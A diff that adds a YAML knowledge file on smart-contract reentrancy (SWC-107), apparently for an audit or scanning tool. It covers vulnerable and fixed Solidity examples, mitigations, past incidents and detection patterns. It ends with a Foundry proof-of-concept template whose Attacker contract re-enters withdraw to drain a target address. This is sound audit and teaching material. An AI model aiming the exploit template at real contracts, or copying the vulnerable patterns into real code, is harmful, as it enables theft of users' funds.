@@ -1,0 +1,236 @@
+name: Reentrancy
+id: SWC-107
+severity: Critical
+cwe: CWE-841
+
+description: |
+  A reentrancy attack occurs when an external call allows the called contract
+  to re-enter the calling function before it completes, potentially leading
+  to unexpected behavior or fund theft.
+
+variants:
+  - name: Classic Reentrancy
+    id: reentrancy-eth
+    description: |
+      External ETH transfer (call, send, transfer) occurs before state update.
+      Attacker's receive/fallback function re-enters the vulnerable function.
+    severity: Critical
+    detection:
+      patterns:
+        - "call{value:"
+        - ".send("
+        - ".transfer("
+      condition: "external_call_before_state_update"
+    example:
+      vulnerable: |
+        function withdraw(uint256 amount) external {
+            require(balances[msg.sender] >= amount);
+            (bool success, ) = msg.sender.call{value: amount}("");
+            require(success);
+            balances[msg.sender] -= amount;  // State update AFTER call
+        }
+      fixed: |
+        function withdraw(uint256 amount) external nonReentrant {
+            require(balances[msg.sender] >= amount);
+            balances[msg.sender] -= amount;  // State update BEFORE call
+            (bool success, ) = msg.sender.call{value: amount}("");
+            require(success);
+        }
+
+  - name: Cross-Function Reentrancy
+    id: reentrancy-cross-function
+    description: |
+      Attacker re-enters through a different function that reads/writes
+      the same state variables as the original function.
+    severity: High
+    detection:
+      condition: "multiple_functions_share_state_with_external_call"
+    example:
+      vulnerable: |
+        function withdraw() external {
+            uint256 amount = balances[msg.sender];
+            (bool success, ) = msg.sender.call{value: amount}("");
+            require(success);
+            balances[msg.sender] = 0;
+        }
+
+        function transfer(address to, uint256 amount) external {
+            require(balances[msg.sender] >= amount);  // Reads stale balance
+            balances[msg.sender] -= amount;
+            balances[to] += amount;
+        }
+
+  - name: Cross-Contract Reentrancy
+    id: reentrancy-cross-contract
+    description: |
+      Attacker re-enters through a callback to a different contract that
+      depends on state from the original contract.
+    severity: High
+    detection:
+      condition: "external_contract_reads_caller_state"
+    example:
+      description: |
+        Contract A calls Contract B, which reads A's state before A updates it.
+        This is common in lending protocols where collateral checks happen
+        in external contracts.
+
+  - name: Read-Only Reentrancy
+    id: reentrancy-readonly
+    description: |
+      View functions return stale/inconsistent data during a reentrancy attack.
+      Other protocols reading this data may make incorrect decisions.
+    severity: Medium
+    detection:
+      patterns:
+        - "view function reads state modified in non-view function with external call"
+    example:
+      description: |
+        A lending protocol's getPrice() function returns the ratio of two
+        reserve values. During a flash loan, these values are temporarily
+        modified, causing incorrect price reads by integrating protocols.
+
+mitigations:
+  - name: ReentrancyGuard
+    description: Use OpenZeppelin's ReentrancyGuard with nonReentrant modifier
+    effectiveness: High
+    code: |
+      import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
+
+      contract Safe is ReentrancyGuard {
+          function withdraw() external nonReentrant {
+              // ...
+          }
+      }
+
+  - name: Checks-Effects-Interactions (CEI)
+    description: Update all state before making external calls
+    effectiveness: High
+    code: |
+      function withdraw(uint256 amount) external {
+          // Checks
+          require(balances[msg.sender] >= amount);
+
+          // Effects (state updates)
+          balances[msg.sender] -= amount;
+
+          // Interactions (external calls)
+          (bool success, ) = msg.sender.call{value: amount}("");
+          require(success);
+      }
+
+  - name: Pull Over Push
+    description: Let users withdraw funds instead of pushing to them
+    effectiveness: Medium
+    code: |
+      mapping(address => uint256) public pendingWithdrawals;
+
+      function claimRefund() external {
+          uint256 amount = pendingWithdrawals[msg.sender];
+          pendingWithdrawals[msg.sender] = 0;
+          payable(msg.sender).transfer(amount);
+      }
+
+historical_exploits:
+  - name: The DAO Hack
+    date: 2016-06-17
+    loss: "$60M"
+    description: |
+      Classic reentrancy attack that drained 3.6M ETH from The DAO,
+      leading to the Ethereum hard fork.
+    link: https://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/
+
+  - name: Cream Finance
+    date: 2021-08-30
+    loss: "$18.8M"
+    description: |
+      Reentrancy via AMP token's ERC777 hooks allowed flash loan attack.
+    link: https://rekt.news/cream-rekt/
+
+  - name: Curve Read-Only Reentrancy
+    date: 2023-07-30
+    loss: "$70M+"
+    description: |
+      Read-only reentrancy in Curve pools exploited via Vyper compiler bug.
+    link: https://rekt.news/curve-vyper-rekt/
+
+detection_tools:
+  slither:
+    - reentrancy-eth
+    - reentrancy-no-eth
+    - reentrancy-benign
+    - reentrancy-events
+    - reentrancy-unlimited-gas
+
+  mythril:
+    - reentrancy
+
+  manual_checks:
+    - "Look for external calls (call, send, transfer, external function calls)"
+    - "Check if state is modified after the external call"
+    - "Verify nonReentrant modifier is used on sensitive functions"
+    - "Check for cross-function state dependencies"
+    - "Review callback patterns (ERC777, flash loans, hooks)"
+
+poc_template: |
+  // SPDX-License-Identifier: MIT
+  pragma solidity ^0.8.20;
+
+  import "forge-std/Test.sol";
+
+  interface IVulnerable {
+      function withdraw(uint256 amount) external;
+      function deposit() external payable;
+      function balanceOf(address) external view returns (uint256);
+  }
+
+  contract ReentrancyPoC is Test {
+      IVulnerable target;
+      Attacker attacker;
+
+      function setUp() public {
+          // Deploy or fork target
+          target = IVulnerable({{TARGET_ADDRESS}});
+          attacker = new Attacker(address(target));
+      }
+
+      function testReentrancy() public {
+          // Fund attacker
+          vm.deal(address(attacker), 1 ether);
+
+          // Record balances
+          uint256 targetBalanceBefore = address(target).balance;
+
+          // Execute attack
+          attacker.attack{value: 1 ether}();
+
+          // Verify drain
+          assertLt(address(target).balance, targetBalanceBefore);
+          assertGt(address(attacker).balance, 1 ether);
+      }
+  }
+
+  contract Attacker {
+      IVulnerable target;
+      uint256 attackCount;
+
+      constructor(address _target) {
+          target = IVulnerable(_target);
+      }
+
+      function attack() external payable {
+          target.deposit{value: msg.value}();
+          target.withdraw(msg.value);
+      }
+
+      receive() external payable {
+          if (attackCount < 10 && address(target).balance >= msg.value) {
+              attackCount++;
+              target.withdraw(msg.value);
+          }
+      }
+  }
+
+references:
+  - https://swcregistry.io/docs/SWC-107
+  - https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/
+  - https://github.com/kadenzipfel/smart-contract-vulnerabilities/blob/master/vulnerabilities/reentrancy.md
